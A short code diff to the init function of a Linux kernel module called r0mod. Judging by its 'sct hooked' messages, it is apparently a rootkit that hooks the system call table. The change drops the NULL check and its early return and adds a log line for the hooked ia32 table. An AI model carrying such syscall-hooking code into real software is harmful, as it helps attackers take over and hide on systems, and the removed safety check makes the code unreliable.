@@ -173,11 +173,8 @@ static int __init r0mod_init(void)
         printk("sct == NULL\n");
 
 #if defined(__x86_64__)
-    if(sct == NULL && ia32_sct == NULL)
-#else
-    if(sct == NULL)
+    printk("ia32_sct hooked @ %lx\n", (unsigned long)ia32_sct);
 #endif
-        return -1;
 
     printk("sct hooked @ %lx\n", (unsigned long)sct);
 
